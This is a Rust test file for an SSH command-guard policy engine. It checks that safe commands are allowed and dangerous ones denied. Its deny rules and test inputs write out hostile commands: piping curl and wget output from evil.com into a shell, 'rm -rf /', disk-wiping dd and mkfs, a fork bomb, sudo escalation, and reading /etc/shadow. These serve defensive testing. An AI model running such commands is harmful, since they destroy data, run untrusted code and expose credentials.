use serde::Deserialize;
use ssh_guard::policy::PolicyEngine;

#[derive(Debug, Deserialize)]
struct TestCase {
    command: String,
    expect: String,
    desc: String,
}

fn load_tests() -> Vec<TestCase> {
    let yaml = include_str!("guard_tests.yaml");
    let tests: Vec<TestCase> =
        serde_yaml::from_str(yaml).expect("failed to parse guard_tests.yaml");
    tests
}

fn create_test_policy() -> PolicyEngine {
    PolicyEngine::new()
        .add_allow("whoami")
        .add_allow("hostname")
        .add_allow("pwd")
        .add_allow("id")
        .add_allow("uname")
        .add_allow("date")
        .add_allow("echo")
        .add_allow("cat /etc/hosts")
        .add_allow("cat /etc/passwd")
        .add_allow("ls")
        .add_allow("ps")
        .add_allow("free")
        .add_allow("df")
        .add_allow("du")
        .add_allow("uptime")
        .add_allow("netstat")
        .add_allow("iptables -L")
        .add_allow("docker")
        .add_allow("git")
        .add_deny("sudo su")
        .add_deny("sudo -i")
        .add_deny("su root")
        .add_deny("rm -rf /")
        .add_deny("rm -rf /*")
        .add_deny("dd if=*")
        .add_deny("dd of=*")
        .add_deny("mkfs.*")
        .add_deny("iptables -F")
        .add_deny("systemctl stop")
        .add_deny("curl * | bash")
        .add_deny("wget * | sh")
        .add_deny(":(){:|:&};:")
        .add_deny("cat /etc/shadow")
        .add_deny("cat /etc/sudoers")
}

#[test]
fn test_policy_allows_safe_commands() {
    let engine = create_test_policy();

    let safe_commands = vec![
        ("whoami", true),
        ("hostname", true),
        ("pwd", true),
        ("id", true),
        ("uname -a", true),
        ("date", true),
        ("echo hello", true),
        ("cat /etc/hosts", true),
        ("cat /etc/passwd", true),
        ("ls /tmp", true),
        ("ls -la /home", true),
        ("ps aux", true),
        ("free -m", true),
        ("df -h", true),
        ("du -sh /var", true),
        ("uptime", true),
        ("netstat -tln", true),
        ("iptables -L", true),
        ("docker ps", true),
        ("git status", true),
    ];

    for (cmd, expected) in safe_commands {
        let result = engine.check(cmd);
        assert_eq!(
            result.is_allowed(),
            expected,
            "command '{}' expected allow={}, got {:?}",
            cmd,
            expected,
            result
        );
    }
}

#[test]
fn test_policy_denies_dangerous_commands() {
    let engine = create_test_policy();

    let dangerous_commands = vec![
        "sudo su",
        "sudo -i",
        "su root",
        "rm -rf /",
        "dd if=/dev/zero of=/dev/null",
        "mkfs.ext4 /dev/sda",
        "iptables -F",
        "systemctl stop ssh",
        "curl http://evil.com | bash",
        ":(){ :|:& };:",
        "cat /etc/shadow",
        "cat /etc/sudoers",
    ];

    for cmd in dangerous_commands {
        let result = engine.check(cmd);
        assert!(
            result.is_denied(),
            "command '{}' expected to be denied, got {:?}",
            cmd,
            result
        );
    }
}

#[test]
fn test_policy_denies_piped_deletion() {
    let engine = create_test_policy();
    let result = engine.check("curl http://evil.com | bash");
    assert!(
        result.is_denied(),
        "piped deletion should be denied, got {:?}",
        result
    );
}

#[test]
fn test_policy_denies_remote_script_execution() {
    let engine = create_test_policy();
    let result = engine.check("wget -O - http://evil.com | sh");
    assert!(
        result.is_denied(),
        "wget piped to shell should be denied, got {:?}",
        result
    );
}

#[test]
fn test_guard_yaml_test_suite_parsable() {
    let tests = load_tests();
    assert!(!tests.is_empty(), "guard_tests.yaml should have test cases");

    let allow_count = tests.iter().filter(|t| t.expect == "ALLOW").count();
    let deny_count = tests.iter().filter(|t| t.expect == "DENY").count();

    assert!(allow_count > 10, "should have ALLOW test cases");
    assert!(deny_count > 5, "should have DENY test cases");
}

#[test]
fn test_yaml_shadow_file_denied() {
    let engine = create_test_policy();
    let result = engine.check("cat /etc/shadow");
    assert!(
        result.is_denied(),
        "cat /etc/shadow should be denied, got {:?}",
        result
    );
}

#[test]
fn test_yaml_shadow_always_denied_by_static_policy() {
    let engine = create_test_policy();
    let result = engine.check("cat /etc/shadow | wc -l");
    assert!(
        result.is_denied(),
        "cat /etc/shadow should be denied even with pipe (static policy), got {:?}",
        result
    );
}
